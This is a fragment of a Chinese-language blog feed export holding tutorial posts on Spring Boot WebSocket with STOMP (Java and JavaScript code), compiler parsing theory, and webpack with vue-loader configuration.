Websocket 协议，进行长连接通信，两端相互传递信息。"></a><strong>握手成功后，由 HTTP 协议升级成 Websocket 协议，进行长连接通信，两端相互传递信息。</strong></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//服务器相应的http头信息</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>upgrade</span><br><span class="line"><span class="attribute">Sec-Websocket-Accept</span><span class="punctuation">: </span>TSF8/KitM+yYRbXmjclgl7DwbHk=</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br></pre></td></tr></table></figure><img src="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019125137411.png" class="lazyload" data-srcset="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019125137411.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211019125137411" style="zoom:50%;"><h1 id="STOMP"><a href="#STOMP" class="headerlink" title="STOMP"></a>STOMP</h1><p>   STOMP（Simple Text-Orientated Messaging Protocol）是一种简单的面向文本的消息传递协议。它提供了一个可互操作的连接格式，允许 STOMP 客户端与任意 STOMP 消息代理（Broker）进行交互。STOMP 协议由于设计简单，易于开发客户端，因此在多种语言和多种平台上得到广泛地应用。</p><p>言而简之就是一种信息封装格式</p><h2 id="Spring封装STOMP"><a href="#Spring封装STOMP" class="headerlink" title="Spring封装STOMP"></a>Spring封装STOMP</h2><p>前端请求后端的基本流程：</p><ul><li><p>先连接stomp的进入点，例如下面程序的是<a href="http://127.0.0.1:8080/inpoint">http://127.0.0.1:8080/inpoint</a></p><ul><li><p>对于发送者来说，对一个地址直接发送一个对象字符串，/liaotian/send</p></li><li><p><code>var message = &#39;&#123;&quot;destination&quot;: &quot;&#39; + SUBSCRIBE + &#39;&quot;, &quot;content&quot;: &quot;&#39; + sendContent + &#39;&quot;&#125;&#39;;</code></p></li><li><p>对于接受者来说，订阅一个topic</p></li></ul></li></ul><p><strong>后端代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WebSocketConfig</span></span><br><span class="line"><span class="keyword">package</span> talk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.simp.config.MessageBrokerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.socket.config.annotation.StompEndpointRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocketMessageBroker</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title">WebSocketMessageBrokerConfigurer</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置 WebSocket 进入点，及开启使用 SockJS，这些配置主要用配置连接端点，用于 WebSocket 连接</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> registry STOMP 端点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerStompEndpoints</span><span class="params">(StompEndpointRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addEndpoint(<span class="string">&quot;/inpoint&quot;</span>).withSockJS();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置消息代理选项</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> registry 消息代理注册配置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureMessageBroker</span><span class="params">(MessageBrokerRegistry registry)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 设置一个或者多个代理前缀，在 Controller 类中的方法里面发生的消息，会首先转发到代理从而发送到对应广播或者队列中。</span></span><br><span class="line">        registry.enableSimpleBroker(<span class="string">&quot;/receive&quot;</span>);</span><br><span class="line">        <span class="comment">// 配置客户端发送请求消息的一个或多个前缀，该前缀会筛选消息目标转发到 Controller 类中注解对应的方法里</span></span><br><span class="line">        registry.setApplicationDestinationPrefixes(<span class="string">&quot;/liaotian&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//MessageController</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageController</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** 消息发送工具对象 */</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SimpMessageSendingOperations simpMessageSendingOperations;</span><br><span class="line">    <span class="comment">/** 广播发送消息，将消息发送到指定的目标地址 */</span></span><br><span class="line">    <span class="meta">@MessageMapping(&quot;/send&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendTopicMessage</span><span class="params">(MessageBody messageBody)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 将消息发送到 WebSocket 配置类中配置的代理中（/topic）进行消息转发</span></span><br><span class="line">        simpMessageSendingOperations.convertAndSend(messageBody.getDestination(), messageBody);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>前端请求代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置 STOMP 客户端</span></span><br><span class="line"><span class="keyword">var</span> stompClient = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 设置 WebSocket 进入端点</span></span><br><span class="line"><span class="keyword">var</span> SOCKET_ENDPOINT = <span class="string">&quot;/inpoint&quot;</span>;</span><br><span class="line"><span class="comment">// 设置订阅消息的请求前缀</span></span><br><span class="line"><span class="keyword">var</span> SUBSCRIBE_PREFIX = <span class="string">&quot;/receive&quot;</span></span><br><span class="line"><span class="comment">// 设置订阅消息的请求地址</span></span><br><span class="line"><span class="keyword">var</span> SUBSCRIBE =<span class="string">&quot;/abc&quot;</span>;</span><br><span class="line"><span class="comment">// 设置服务器端点，访问服务器中哪个接口</span></span><br><span class="line"><span class="keyword">var</span> SEND_ENDPOINT = <span class="string">&quot;/liaotian/send&quot;</span>;</span><br><span class="line"><span class="comment">/* 进行连接 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 设置 SOCKET</span></span><br><span class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> SockJS(SOCKET_ENDPOINT);</span><br><span class="line">    <span class="comment">// 配置 STOMP 客户端</span></span><br><span class="line">    stompClient = Stomp.over(socket);</span><br><span class="line">    <span class="comment">// STOMP 客户端连接</span></span><br><span class="line">    stompClient.connect(&#123;&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">frame</span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;连接成功&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 订阅信息 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">subscribeSocket</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 设置订阅地址</span></span><br><span class="line">    SUBSCRIBE = SUBSCRIBE_PREFIX + $(<span class="string">&quot;#subscribe&quot;</span>).val();</span><br><span class="line">    <span class="comment">// 输出订阅地址</span></span><br><span class="line">    alert(<span class="string">&quot;设置订阅地址为：&quot;</span> + SUBSCRIBE);</span><br><span class="line">    <span class="comment">// 执行订阅消息</span></span><br><span class="line">    stompClient.subscribe(SUBSCRIBE, <span class="function"><span class="keyword">function</span>(<span class="params">responseBody</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> receiveMessage = <span class="built_in">JSON</span>.parse(responseBody.body);</span><br><span class="line">        $(<span class="string">&quot;#information&quot;</span>).append(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + receiveMessage.content + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 断开连接 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">disconnect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    stompClient.disconnect(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;断开连接&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 发送消息并指定目标地址（这里设置的目标地址为自身订阅消息的地址，当然也可以设置为其它地址） */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendMessageNoParameter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 设置发送的内容</span></span><br><span class="line">    <span class="keyword">var</span> sendContent = $(<span class="string">&quot;#content&quot;</span>).val();</span><br><span class="line">    <span class="comment">// 设置待发送的消息内容</span></span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">&#x27;&#123;&quot;destination&quot;: &quot;&#x27;</span> + SUBSCRIBE + <span class="string">&#x27;&quot;, &quot;content&quot;: &quot;&#x27;</span> + sendContent + <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    stompClient.send(SEND_ENDPOINT, &#123;&#125;, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>编译原理-语法分析</title>
      <link href="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/"/>
      <url>/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="语法分析方法"><a href="#语法分析方法" class="headerlink" title="语法分析方法"></a>语法分析方法</h1><h2 id="自上而下"><a href="#自上而下" class="headerlink" title="自上而下"></a>自上而下</h2><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018194258402.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018194258402.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018194258402" style="zoom: 50%;"><h3 id="文法左递归问题"><a href="#文法左递归问题" class="headerlink" title="文法左递归问题"></a>文法左递归问题</h3><h6 id><a href="#" class="headerlink" title></a><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018195422054.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018195422054.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018195422054" style="zoom:50%;"><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018195619818.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018195619818.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018195619818" style="zoom:50%;"><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018195931500.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018195931500.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018195931500" style="zoom:50%;"><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018200913271.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018200913271.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018200913271" style="zoom:50%;"></h6><h6 id="间接左递归的消除"><a href="#间接左递归的消除" class="headerlink" title="间接左递归的消除"></a>间接左递归的消除</h6><p><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018202446232.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018202446232.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018202446232" style="zoom:50%;"><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018203350177.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018203350177.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018203350177" style="zoom:50%;"></p><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018203836890.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018203836890.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018203836890" style="zoom:50%;"><h3 id="回溯问题"><a href="#回溯问题" class="headerlink" title="回溯问题"></a>回溯问题</h3><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018210729909.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018210729909.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018210729909" style="zoom:50%;"><p>自下而上</p><img src="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018194330689.png" class="lazyload" data-srcset="/2021/10/18/%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image-20211018194330689.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211018194330689" style="zoom: 50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack使用</title>
      <link href="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Webpack基本配置"><a href="#Webpack基本配置" class="headerlink" title="Webpack基本配置"></a>Webpack基本配置</h1><h3 id="设置webpack-config-js"><a href="#设置webpack-config-js" class="headerlink" title="设置webpack.config.js"></a>设置webpack.config.js</h3><p>设置对应的打包入口以及打包出口，_dirname可以拿到绝对目录，并且需要手动安装vue-loader<code>npm install vue-loader -D</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入path模块</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> VueLoaderPlugin = <span class="built_in">require</span>(<span class="string">&quot;vue-loader/lib/plugin&quot;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&quot;development&quot;</span>,</span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">        <span class="attr">path</span>: path.resolve(__dirname, <span class="string">&quot;dist&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//配置打包规则</span></span><br><span class="line">    <span class="attr">module</span>: &#123;</span><br><span class="line">        <span class="attr">rules</span>: [&#123;</span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.vue$/</span>, <span class="comment">//这里是正则表达式，只要是.vue结尾都用vue-loader解析</span></span><br><span class="line">            loader: <span class="string">&quot;vue-loader&quot;</span></span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 插件配置</span></span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="keyword">new</span> VueLoaderPlugin() <span class="comment">//实例化VueLoaderPlugin插件</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="设置package-js"><a href="#设置package-js" class="headerlink" title="设置package.js"></a>设置package.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;build&quot;</span>: <span class="string">&quot;webpack&quot;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="vue-loader"><a href="#vue-loader" class="headerlink" title="vue-loader"></a>vue-loader</h3><p>实现对.vue文件的打包</p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117175330829.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117175330829.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117175330829" style="zoom:50%;"><h3 id="file-loader"><a href="#file-loader" class="headerlink" title="file-loader"></a>file-loader</h3><p>安装</p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117191450901.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117191450901.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117191450901" style="zoom:67%;"><p>设置规则</p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117193537518.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117193537518.png" 